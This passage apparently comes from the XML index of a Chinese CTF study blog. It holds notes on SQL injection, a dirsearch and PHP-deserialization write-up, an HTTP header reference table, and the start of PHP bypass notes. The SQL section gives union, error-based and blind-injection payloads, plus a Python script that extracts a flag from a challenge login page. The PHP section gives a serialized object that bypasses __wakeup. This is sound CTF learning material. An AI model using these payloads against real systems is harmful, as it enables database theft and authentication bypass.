class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<span class="hljs-operator">%</span><span class="hljs-number">23</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>b4bsql<span class="hljs-string">&#x27;)%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())<span class="hljs-operator">%</span><span class="hljs-number">23</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),(select group_concat(password) from b4bsql)%23</span><br></code></pre></div></td></tr></table></figure><p>报错注入流程</p><p>报错注入只要套用公式即可，公式如下(第一个公式count(*)、floor()、rand()、group by<br>不可或缺，后两个公式有32位的限制):</p><blockquote><p>?id=2’ and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (se<br>lect (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+</p><p>+++++++++++++++++++</p><p>?id=2’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)–+</p><p>+++++++++++</p><p>?id=1’ and extractvalue(1, concat(0x7e, (select @@version),0x7e))–+</p><p>+++++++++++</p></blockquote><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">len</span>(<span class="hljs-params">url,sql=<span class="hljs-string">&quot;1&#x27;or length(database())=%d#&quot;</span></span>):</span><br>    i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(i):<br>        <span class="hljs-comment">#print(&quot;进行长度%d尝试&quot;%(i))</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;name&#x27;</span>:sql%(i),<br>            <span class="hljs-string">&#x27;pass&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        r=requests.post(url=url,data=data)<br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-keyword">return</span> i<br>            <span class="hljs-keyword">break</span><br>        i=i+<span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jt</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            data=&#123;<br>                <span class="hljs-string">&quot;name&quot;</span>:sql%(i,j),<br>                <span class="hljs-string">&#x27;pass&#x27;</span>:<span class="hljs-string">&#x27;12&#x27;</span><br>            &#125;<br>            r=requests.post(url=url,data=data)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br>s=<span class="hljs-string">&quot;asdfghjklqwertyuiopzxcvbnm-+=,._1234567890&#125;&#123;&quot;</span><br><span class="hljs-comment">#表名</span><br><span class="hljs-comment"># &quot;1&#x27; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#x27;%s&#x27;#&quot;</span><br><span class="hljs-comment">#字段名</span><br><span class="hljs-comment"># sql=&quot;1&#x27; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#x27;fl4g&#x27;),%d,1)=&#x27;%s&#x27;#&quot;</span><br><span class="hljs-comment">#具体内容</span><br>sql=<span class="hljs-string">&quot;1&#x27; or substr((selEct group_concat(flag) from fl4g),%d,1)=&#x27;%s&#x27;#&quot;</span><br>url=<span class="hljs-string">&quot;http://fbf847ce-c51f-4851-bd8b-dfc7bf7128b8.node3.buuoj.cn/login.php&quot;</span><br>jt(url,sql)<br></code></pre></div></td></tr></table></figure><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><p>查不全时可用left(),right()</p><p>例子如下:数字表示显示最右边的多少个</p><p>group_concat((right(password,25)))</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>ctf</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dirsearch</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/dirsearch/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/dirsearch/</url>
    
    <content type="html"><![CDATA[<h1 id="目录扫描器"><a href="#目录扫描器" class="headerlink" title="目录扫描器"></a>目录扫描器</h1><p><a href="https://github.com/maurosoria/dirsearch">git地址</a></p><p><a href="https://github.com/maurosoria/dirsearch#readme">使用方法</a></p><h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a><strong>[极客大挑战 2019]PHP</strong></h2><p>1.网站的备份文件：<a href="http://www.zip/">www.zip</a><br> 2.Php 反序列化漏洞：当反序列化字符串时，如果表示属性个数的值大于真实属性个数，就会跳过_wakeup函数的执行</p><p>下载<a href="http://www.zip文件之后阅读原代码/">www.zip文件之后阅读原代码</a></p><p>集中在class.php文件中</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-comment">//创建对象时执行的</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-comment">//对象反序列化时被调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//对象被销毁时调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>构造对应的payload</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Name(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">100</span>);<br>var_dump (serialize(<span class="hljs-variable">$a</span>));<br></code></pre></div></td></tr></table></figure><p>最后因为要绕过wakeup,把Name后的数字改成3.因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00</p><p>结果如下</p><blockquote><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></div></td></tr></table></figure></blockquote>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>http基础</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/http%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/http%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP消息头"><a href="#HTTP消息头" class="headerlink" title="HTTP消息头"></a>HTTP消息头</h1><h3 id="1-关于HTTP消息头"><a href="#1-关于HTTP消息头" class="headerlink" title="1. 关于HTTP消息头"></a>1. 关于HTTP消息头</h3><p><code>HTTP消息头</code>是在，客户端请求（Request）或服务器响应（Response）时传递的，位请求或响应的第一行，<code>HTTP消息体</code>（请求或响应的内容）是其后传输。<code>HTTP消息头</code>，以明文的字符串格式传送，是以冒号分隔的键/值对，如：<code>Accept-Charset: utf-8</code>，每一个消息头最后以回车符(<code>CR</code>)和换行符(<code>LF</code>)结尾。<code>HTTP消息头</code>结束后，会用一个空白的字段来标识，这样就会出现两个连续的<code>CR-LF</code>。</p><p><code>HTTP消息头</code>由IANA（The Internet Assigned Numbers Authority，互联网数字分配机构）来整理和维护。其标准最早来源于<a href="http://tools.ietf.org/html/rfc4229">RFC 4229</a>。IANA将其整理到了<a href="http://www.iana.org/assignments/message-headers/perm-headers.html">消息头</a>文档，文档中还包括了<a href="http://www.iana.org/assignments/message-headers/message-headers.xhtml#prov-headersl">一些新提出的信息头</a>。</p><p><code>HTTP消息头</code>支持自定义， 自定义的专用消息头一般会添加<code>&#39;X-&#39;</code>前缀。</p><h3 id="2-常用的HTTP请求头"><a href="#2-常用的HTTP请求头" class="headerlink" title="2. 常用的HTTP请求头"></a>2. 常用的<code>HTTP请求头</code></h3><table><thead><tr><th>协议头</th><th>说明</th><th>示例</th><th>状态</th></tr></thead><tbody><tr><td>Accept</td><td>可接受的响应内容类型（<code>Content-Types</code>）。</td><td><code>Accept: text/plain</code></td><td>固定</td></tr><tr><td>Accept-Charset</td><td>可接受的字符集</td><td><code>Accept-Charset: utf-8</code></td><td>固定</td></tr><tr><td>Accept-Encoding</td><td>可接受的响应内容的编码方式。</td><td><code>Accept-Encoding: gzip, deflate</code></td><td>固定</td></tr><tr><td>Accept-Language</td><td>可接受的响应内容语言列表。</td><td><code>Accept-Language: en-US</code></td><td>固定</td></tr><tr><td>Accept-Datetime</td><td>可接受的按照时间来表示的响应内容版本</td><td>Accept-Datetime: Sat, 26 Dec 2015 17:30:00 GMT</td><td>临时</td></tr><tr><td>Authorization</td><td>用于表示HTTP协议中需要认证资源的认证信息</td><td>Authorization: Basic OSdjJGRpbjpvcGVuIANlc2SdDE==</td><td>固定</td></tr><tr><td>Cache-Control</td><td>用来指定当前的请求/回复中的，是否使用缓存机制。</td><td><code>Cache-Control: no-cache</code></td><td>固定</td></tr><tr><td>Connection</td><td>客户端（浏览器）想要优先使用的连接类型</td><td><code>Connection: keep-alive``Connection: Upgrade</code></td><td>固定</td></tr><tr><td>Cookie</td><td>由之前服务器通过<code>Set-Cookie</code>（见下文）设置的一个HTTP协议Cookie</td><td><code>Cookie: $Version=1; Skin=new;</code></td><td>固定：标准</td></tr><tr><td>Content-Length</td><td>以8进制表示的请求体的长度</td><td><code>Content-Length: 348</code></td><td>固定</td></tr><tr><td>Content-MD5</td><td>请求体的内容的二进制 MD5 散列值（数字签名），以 Base64 编码的结果</td><td>Content-MD5: oD8dH2sgSW50ZWdyaIEd9D==</td><td>废弃</td></tr><tr><td>Content-Type</td><td>请求体的MIME类型 （用于POST和PUT请求中）</td><td>Content-Type: application/x-www-form-urlencoded</td><td>固定</td></tr><tr><td>Date</td><td>发送该消息的日期和时间（以<a href="http://tools.ietf.org/html/rfc7231#section-7.1.1.1">RFC 7231</a>中定义的”HTTP日期”格式来发送）</td><td>Date: Dec, 26 Dec 2015 17:30:00 GMT</td><td>固定</td></tr><tr><td>Expect</td><td>表示客户端要求服务器做出特定的行为</td><td><code>Expect: 100-continue</code></td><td>固定</td></tr><tr><td>From</td><td>发起此请求的用户的邮件地址</td><td><code>From: user@itbilu.com</code></td><td>固定</td></tr><tr><td>Host</td><td>表示服务器的域名以及服务器所监听的端口号。如果所请求的端口是对应的服务的标准端口（80），则端口号可以省略。</td><td><code>Host: www.itbilu.com:80``Host: www.itbilu.com</code></td><td>固定</td></tr><tr><td>If-Match</td><td>仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要用于像 PUT 这样的方法中，仅当从用户上次更新某个资源后，该资源未被修改的情况下，才更新该资源。</td><td>If-Match: “9jd00cdj34pss9ejqiw39d82f20d0ikd”</td><td>固定</td></tr><tr><td>If-Modified-Since</td><td>允许在对应的资源未被修改的情况下返回304未修改</td><td>If-Modified-Since: Dec, 26 Dec 2015 17:30:00 GMT</td><td>固定</td></tr><tr><td>If-None-Match</td><td>允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ），参考 超文本传输协议 的实体标记</td><td>If-None-Match: “9jd00cdj34pss9ejqiw39d82f20d0ikd”</td><td>固定</td></tr><tr><td>If-Range</td><td>如果该实体未被修改过，则向返回所缺少的那一个或多个部分。否则，返回整个新的实体</td><td>If-Range: “9jd00cdj34pss9ejqiw39d82f20d0ikd”</td><td>固定</td></tr><tr><td>If-Unmodified-Since</td><td>仅当该实体自某个特定时间以来未被修改的情况下，才发送回应。</td><td>If-Unmodified-Since: Dec, 26 Dec 2015 17:30:00 GMT</td><td>固定</td></tr><tr><td>Max-Forwards</td><td>限制该消息可被代理及网关转发的次数。</td><td><code>Max-Forwards: 10</code></td><td>固定</td></tr><tr><td>Origin</td><td>发起一个针对<a href="http://itbilu.com/javascript/js/VkiXuUcC.html">跨域资源共享</a>的请求（该请求要求服务器在响应中加入一个<code>Access-Control-Allow-Origin</code>的消息头，表示访问控制所允许的来源）。</td><td><code>Origin: http://www.itbilu.com</code></td><td>固定: 标准</td></tr><tr><td>Pragma</td><td>与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生。</td><td><code>Pragma: no-cache</code></td><td>固定</td></tr><tr><td>Proxy-Authorization</td><td>用于向代理进行认证的认证信息。</td><td>Proxy-Authorization: Basic IOoDZRgDOi0vcGVuIHNlNidJi2==</td><td>固定</td></tr><tr><td>Range</td><td>表示请求某个实体的一部分，字节偏移以0开始。</td><td><code>Range: bytes=500-999</code></td><td>固定</td></tr><tr><td>Referer</td><td>表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。<code>Referer</code>其实是<code>Referrer</code>这个单词，但RFC制作标准时给拼错了，后来也就将错就错使用<code>Referer</code>了。</td><td>Referer: <a href="http://itbilu.com/nodejs">http://itbilu.com/nodejs</a></td><td>固定</td></tr><tr><td>TE</td><td>浏览器预期接受的传输时的编码方式：可使用回应协议头<code>Transfer-Encoding</code>中的值（还可以使用”trailers”表示数据传输时的分块方式）用来表示浏览器希望在最后一个大小为0的块之后还接收到一些额外的字段。</td><td><code>TE: trailers,deflate</code></td><td>固定</td></tr><tr><td>User-Agent</td><td>浏览器的身份标识字符串</td><td><code>User-Agent: Mozilla/……</code></td><td>固定</td></tr><tr><td>Upgrade</td><td>要求服务器升级到一个高版本协议。</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td><td>固定</td></tr><tr><td>Via</td><td>告诉服务器，这个请求是由哪些代理发出的。</td><td>Via: 1.0 fred, 1.1 itbilu.com.com (Apache/1.1)</td><td>固定</td></tr><tr><td>Warning</td><td>一个一般性的警告，表示在实体内容体中可能存在错误。</td><td>Warning: 199 Miscellaneous warning</td><td>固定</td></tr><tr><td>X-Forwarded-For</td><td>XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。</td><td>IP0, IP1, IP2</td><td>固定</td></tr></tbody></table><h3 id="3-常用的HTTP响应头"><a href="#3-常用的HTTP响应头" class="headerlink" title="3. 常用的HTTP响应头"></a>3. 常用的<code>HTTP响应头</code></h3><table><thead><tr><th>响应头</th><th>说明</th><th>示例</th><th>状态</th></tr></thead><tbody><tr><td>Access-Control-Allow-Origin</td><td>指定哪些网站可以<code>跨域源资源共享</code></td><td><code>Access-Control-Allow-Origin: *</code></td><td>临时</td></tr><tr><td>Accept-Patch</td><td>指定服务器所支持的文档补丁格式</td><td>Accept-Patch: text/example;charset=utf-8</td><td>固定</td></tr><tr><td>Accept-Ranges</td><td>服务器所支持的内容范围</td><td><code>Accept-Ranges: bytes</code></td><td>固定</td></tr><tr><td>Age</td><td>响应对象在代理缓存中存在的时间，以秒为单位</td><td><code>Age: 12</code></td><td>固定</td></tr><tr><td>Allow</td><td>对于特定资源的有效动作;</td><td><code>Allow: GET, HEAD</code></td><td>固定</td></tr><tr><td>Cache-Control</td><td>通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒</td><td><code>Cache-Control: max-age=3600</code></td><td>固定</td></tr><tr><td>Connection</td><td>针对该连接所预期的选项</td><td><code>Connection: close</code></td><td>固定</td></tr><tr><td>Content-Disposition</td><td>对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。</td><td>Content-Disposition: attachment; filename=”fname.ext”</td><td>固定</td></tr><tr><td>Content-Encoding</td><td>响应资源所使用的编码类型。</td><td><code>Content-Encoding: gzip</code></td><td>固定</td></tr><tr><td>Content-Language</td><td>响就内容所使用的语言</td><td><code>Content-Language: zh-cn</code></td><td>固定</td></tr><tr><td>Content-Length</td><td>响应消息体的长度，用8进制字节表示</td><td><code>Content-Length: 348</code></td><td>固定</td></tr><tr><td>Content-Location</td><td>所返回的数据的一个候选位置</td><td><code>Content-Location: /index.htm</code></td><td>固定</td></tr><tr><td>Content-MD5</td><td>响应内容的二进制 MD5 散列值，以 Base64 方式编码</td><td>Content-MD5: IDK0iSsgSW50ZWd0DiJUi==</td><td>已淘汰</td></tr><tr><td>Content-Range</td><td>如果是响应部分消息，表示属于完整消息的哪个部分</td><td>Content-Range: bytes 21010-47021/47022</td><td>固定</td></tr><tr><td>Content-Type</td><td>当前内容的<code>MIME</code>类型</td><td>Content-Type: text/html; charset=utf-8</td><td>固定</td></tr><tr><td>Date</td><td>此条消息被发送时的日期和时间(以<a href="http://tools.ietf.org/html/rfc7231#section-7.1.1.1">RFC 7231</a>中定义的”HTTP日期”格式来表示)</td><td>Date: Tue, 15 Nov 1994 08:12:31 GMT</td><td>固定</td></tr><tr><td>ETag</td><td>对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td><td>ETag: “737060cd8c284d8af7ad3082f209582d”</td><td>固定</td></tr><tr><td>Expires</td><td>指定一个日期/时间，超过该时间则认为此回应已经过期</td><td>Expires: Thu, 01 Dec 1994 16:00:00 GMT</td><td>固定: 标准</td></tr><tr><td>Last-Modified</td><td>所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td><td>Last-Modified: Dec, 26 Dec 2015 17:30:00 GMT</td><td>固定</td></tr><tr><td>Link</td><td>用来表示与另一个资源之间的类型关系，此类型关系是在<a href="https://tools.ietf.org/html/rfc5988">RFC 5988</a>中定义</td><td><code>Link: </code>; rel=”alternate”</td><td>固定</td></tr><tr><td>Location</td><td>用于在进行重定向，或在创建了某个新资源时使用。</td><td>Location: <a href="http://www.itbilu.com/nodejs">http://www.itbilu.com/nodejs</a></td><td>固定</td></tr><tr><td>P3P</td><td>P3P策略相关设置</td><td>P3P: CP=”This is not a P3P policy!</td><td>固定</td></tr><tr><td>Pragma</td><td>与具体的实现相关，这些响应头可能在请求/回应链中的不同时候产生不同的效果</td><td><code>Pragma: no-cache</code></td><td>固定</td></tr><tr><td>Proxy-Authenticate</td><td>要求在访问代理时提供身份认证信息。</td><td><code>Proxy-Authenticate: Basic</code></td><td>固定</td></tr><tr><td>Public-Key-Pins</td><td>用于防止中间攻击，声明网站认证中传输层安全协议的证书散列值</td><td>Public-Key-Pins: max-age=2592000; pin-sha256=”……”;</td><td>固定</td></tr><tr><td>Refresh</td><td>用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。</td><td>Refresh: 5; url=<a href="http://itbilu.com/">http://itbilu.com</a></td><td></td></tr><tr><td>Retry-After</td><td>如果某个实体临时不可用，那么此协议头用于告知客户端稍后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。</td><td>示例1:Retry-After: 120示例2: Retry-After: Dec, 26 Dec 2015 17:30:00 GMT</td><td>固定</td></tr><tr><td>Server</td><td>服务器的名称</td><td><code>Server: nginx/1.6.3</code></td><td>固定</td></tr><tr><td>Set-Cookie</td><td>设置<code>HTTP cookie</code></td><td>Set-Cookie: UserID=itbilu; Max-Age=3600; Version=1</td><td>固定: 标准</td></tr><tr><td>Status</td><td>通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。</td><td><code>Status: 200 OK</code></td><td></td></tr><tr><td>Trailer</td><td><code>Trailer</code>用户说明传输中分块编码的编码信息</td><td><code>Trailer: Max-Forwards</code></td><td>固定</td></tr><tr><td>Transfer-Encoding</td><td>用表示实体传输给用户的编码形式。包括：<code>chunked</code>、<code>compress</code>、 <code>deflate</code>、<code>gzip</code>、<code>identity</code>。</td><td>Transfer-Encoding: chunked</td><td>固定</td></tr><tr><td>Upgrade</td><td>要求客户端升级到另一个高版本协议。</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td><td>固定</td></tr><tr><td>Vary</td><td>告知下游的代理服务器，应当如何对以后的请求协议头进行匹配，以决定是否可使用已缓存的响应内容而不是重新从原服务器请求新的内容。</td><td><code>Vary: *</code></td><td>固定</td></tr><tr><td>Via</td><td>告知代理服务器的客户端，当前响应是通过什么途径发送的。</td><td>Via: 1.0 fred, 1.1 itbilu.com (nginx/1.6.3)</td><td>固定</td></tr><tr><td>Warning</td><td>一般性警告，告知在实体内容体中可能存在错误。</td><td>Warning: 199 Miscellaneous warning</td><td>固定</td></tr><tr><td>WWW-Authenticate</td><td>表示在请求获取这个实体时应当使用的认证模式。</td><td><code>WWW-Authenticate: Basic</code></td><td>固定</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php基本</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/php%E5%9F%BA%E6%9C%AC/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/php%E5%9F%BA%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="php常见绕过"><a href="#php常见绕过" class="headerlink" title="php常见绕过"></a>php常见绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?<br><br>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><h2 id="PHP读取文件"><a href="#PHP读取文件" class="headerlink" title="PHP读取文件"></a>PHP读取文件</h2><p>scandir()</p><p>file_get_contents()</p><p>将string转换为chr使用函数ord()</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$tmp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tmp&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$tmp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span 